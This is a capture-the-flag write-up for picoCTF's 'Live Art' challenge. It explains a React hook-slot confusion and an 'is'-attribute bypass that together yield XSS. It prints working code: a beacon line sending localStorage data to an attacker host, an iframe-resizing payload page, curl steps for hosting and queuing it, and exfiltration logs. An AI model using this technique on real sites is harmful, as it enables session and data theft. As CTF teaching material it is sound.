# Live Art: picoCTF 2022 (Web Exploitation, Hard)

**Flag:** `picoCTF{beam_me_up_reacty_6bdeba69}`

> "There's nothing quite as fun as drawing for an audience. So sign up for LiveArt today and show the world what you can do."

A collaborative drawing app (React 17 + `react-router-dom` v6 SPA, Express + Puppeteer backend, peerjs for the live streaming). The flag is planted in a bot's browser `localStorage`; you must land XSS in the app's origin to read and exfiltrate it.

---

## 1. Recon

The bundle splits into `client/` (the React SPA) and `server/` (the bot + queue).

### The bot (`server/src/page-worker.ts`)

```ts
const ORIGIN = "http://localhost:4000";
const flag = JSON.parse(metadata.toString("utf-8")).flag as string;

const visitOne = async () => {
    const url = await dequeue();
    ...
    await page.goto(ORIGIN);
    await page.evaluate(([bongoCat, flag]) => {
        localStorage.setItem("image", bongoCat);
        localStorage.setItem("username", JSON.stringify(flag)); // <-- flag lives here
    }, [bongoCat, flag]);
    await page.close();

    const secondPage = await browser.newPage();
    await Promise.race([ secondPage.goto(url), sleep(3000) ]); // visits OUR url
    await sleep(3000);
    await browser.close();
};
```

So the bot:
1. Opens `http://localhost:4000` and stores the flag in `localStorage["username"]` (JSON-stringified, i.e. with surrounding quotes).
2. Navigates to a URL **we** submit, then closes after ~6 s.

### Submitting a URL (`server/src/index.ts`)

```ts
app.post("/fan-mail", async (req, res) => {
    const { url } = req.body;
    const asUrl = new URL(url);
    if (asUrl.protocol !== "http:" && asUrl.protocol !== "https:")
        return res.status(500).send("URL must be http or https");
    const success = await enqueue(url, ip);
    ...
});
```

We can queue any `http`/`https` URL (max 3 per IP). The reminder in the UI confirms the target: **attack `http://localhost:4000`, not the public origin.**

### Goal

`localStorage["username"]` (the flag) is readable only by JavaScript running in the `http://localhost:4000` origin. Same-origin policy blocks a page we merely host from reading it: we need **XSS in the app itself**.

---

## 2. The vulnerability

### 2a. React hook-slot confusion via inline component switching

`client/src/components/drawing/index.tsx`:

```tsx
const getWrappedError  = WrapComponentError(ErrorPage);
const getWrappedViewer = WrapComponentError(Viewer);
const isWideEnough = () => window.innerWidth > 600;

const _Drawing = (props) => {
    const [image, setImage] = React.useState();
    const [bigEnough, setBigEnough] = React.useState(isWideEnough());
    // ...peerjs + resize listeners...

    const view = bigEnough
        ? getWrappedViewer({ image })
        : getWrappedError({ error: "Please make your window bigger" });

    return <div>{ view }</div>;
};
```

The two branches are **plain function calls**, not `<Component/>` elements. Their hooks therefore execute *inside `_Drawing`'s own fiber*, at the **same hook index**, whenever `bigEnough` toggles.

- `ErrorPage` runs `useHashParams()` at that slot: a `useState` seeded with **all URL-hash params**:

  ```tsx
  const getHashParams = () => {
      const params = new URLSearchParams(window.location.hash.substring(1));
      const result = Object.create(null);
      params.forEach((value, key) => { result[key] = value; });
      return result; // e.g. { is, onerror, src }
  };
  export const useHashParams = () => {
      const [params, setParams] = React.useState(getHashParams());
      ...
      return params;
  };
  ```

- `Viewer` runs `useReducer(...)` at that same slot for its `dimensions`, and **spreads it onto an `<img>`**:

  ```tsx
  // client/src/components/viewer/index.tsx
  const [dimensions, updateDimensions] = React.useReducer(/* ... */, baseResolution);
  return (
      <div>
          <h1>Viewing</h1>
          
      </div>
  );
  ```

React reconciles `useState` and `useReducer` as the same slot kind, so it **preserves the slot's state across the switch**. When the view flips **ErrorPage → Viewer**, `useReducer` ignores its `baseResolution` initializer and returns the *existing* state: the **hash-params object**: which is then spread onto the `<img>`.

Result: `<img>` gets whatever attributes we put in the URL hash.

### 2b. React `is`-attribute bypass

React normally refuses to render an `onerror` (or any event handler) as an attribute on a standard element. But if the spread props contain an **`is`** key (a string), React treats the element as a custom element (Web Component) and writes attributes **verbatim**: including `onerror`. So:

```
#is=asd&onerror=<js>&src=peko
```

produces `" src="peko">`, a *real* error handler. `src=peko` resolves to a non-image response, fails to load, and fires `onerror`: executing our JS in the `http://localhost:4000` origin.

### 2c. Triggering the ErrorPage → Viewer flip

`bigEnough = window.innerWidth > 600`. We need the component to render **ErrorPage first** (to seed the slot with the hash params), then flip to **Viewer**. We can't resize the bot's top-level window, so we host the app inside an **iframe we control** and animate its width:

- start narrow (`innerWidth ≤ 600`) → `ErrorPage` seeds the slot,
- widen (`> 600`) → `Viewer` reuses the hash-params object → `onerror` fires.

---

## 3. Exploit

### 3a. The payload page

The exfil JS placed in the `onerror` hash param (percent-encode the **whole** thing, so `+`/spaces survive `URLSearchParams`, which turns a literal `+` into a space):

```js
new Image().src='http://<attacker-host>/e?flag=' + encodeURIComponent(localStorage.getItem('username'))
```

Hosted page (the URL submitted to `/fan-mail`):

```html
<!doctype html><meta charset=utf-8><title>fan mail</title>
<iframe id=f style="width:50px;height:300px;border:0"></iframe>
<script>
  new Image().src="//<attacker-host>/loaded";            // beacon: outer script ran
  var f = document.getElementById('f');
  f.src = "http://localhost:4000/drawing/peko#is=asd&onerror=<ENCODED_EXFIL>&src=peko";
  var wide = false;
  setInterval(function(){ wide=!wide; f.style.width = wide ? '1000px' : '50px'; }, 400); // ErrorPage <-> Viewer
</script>
```

The 400 ms interval guarantees several narrow→wide transitions inside the bot's ~6 s window.

### 3b. Hosting hurdles (the real "hard" part)

- **You need a top page you control** (to host the resizing iframe). Submitting `http://localhost:4000/drawing/...` directly doesn't work: the bot's viewport is >600 px, so `Viewer` renders first and the slot is never seeded from the hash.
- **webhook.site is a dead end**: its free tier injects a CSP on custom responses:
  `content-security-policy: ... script-src 'none'; worker-src 'none'; frame-src 'none';`
  which kills both our inline `<script>` and the iframe.
- **requestrepo.com works**: plain HTTP, no CSP, request logging. Configure the response via its API:
  - `POST /api/v2/sessions` → `{ token, subdomain }`
  - `PUT /api/v2/files` with `{"index.html":{"raw":<base64 body>,"headers":[...],"status_code":200}}` (Bearer token)
  - `GET /api/v2/requests` to read logged hits (the exfil).
- **Mixed content is *not* a problem for the iframe:** even though requestrepo is HTTPS-preloaded (so the outer page loads over https), `http://localhost` is a "potentially trustworthy" origin and is **exempt from mixed-content blocking**, so the `http://localhost:4000` iframe loads fine. (A public `http://` iframe *would* be blocked: which is why an early test pointed at the public site failed.)

### 3c. Firing it

```bash
# 1) get a requestrepo session
curl -s -X POST https://requestrepo.com/api/v2/sessions   # -> token + subdomain

# 2) PUT the payload page as index.html (base64 raw + text/html header, no CSP)
#    (done via the /api/v2/files endpoint with the Bearer token)

# 3) queue it to the bot
curl -s -X POST "http://saturn.picoctf.net:<PORT>/fan-mail" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://<subdomain>.requestrepo.com/"}'

# 4) poll the log
curl -s -H "Authorization: Bearer <token>" \
     "https://requestrepo.com/api/v2/requests?limit=40"
```

The log showed the bot's beacon and the exfil:

```
GET http://<subdomain>.requestrepo.com/loaded
GET http://<subdomain>.requestrepo.com/e?flag=%22picoCTF%7Bbeam_me_up_reacty_6bdeba69%7D%22
```

URL/JSON-decoding `%22picoCTF%7B...%7D%22` (the `%22` are the quotes from `JSON.stringify(flag)`):

```
picoCTF{beam_me_up_reacty_6bdeba69}
```

---

## 4. Full attack chain (summary)

1. Bot stores flag in `localStorage["username"]` at `http://localhost:4000`, then visits our URL.
2. Our page (hosted on requestrepo, no CSP) frames `http://localhost:4000/drawing/peko#is=asd&onerror=<exfil>&src=peko` in a **narrow** iframe → `ErrorPage` seeds the shared hook slot with `{is, onerror, src}`.
3. Widening the iframe flips to `Viewer`; React **reuses the hook slot**, spreading the hash params onto `<img>`.
4. The `is` key makes React set `onerror` as a real attribute; `src=peko` fails → `onerror` runs in the app origin.
5. The handler reads `localStorage.username` and beacons it to our server → **flag**.

## 5. Fixes / lessons

- **Don't call components as functions** to switch views: render real elements (`<Viewer/>` / `<ErrorPage/>`) so hook state can't bleed across a shared slot. Mounting distinct component types resets their hooks.
- Never spread untrusted key/value maps (e.g. all URL params) onto DOM elements.
- The `is` attribute is an escape hatch around React's attribute sanitization: treat any user-controlled `is` as dangerous.
- Decoy note: the source hardcodes `picoCTF{copilot_says_bongo_cat_is_awesome` in `page-worker.ts`, but the real flag comes from the bot's live `localStorage`.

**Vulnerable files:** `client/src/components/drawing/index.tsx`, `client/src/components/viewer/index.tsx`, `client/src/hooks/index.tsx` (`useHashParams`).
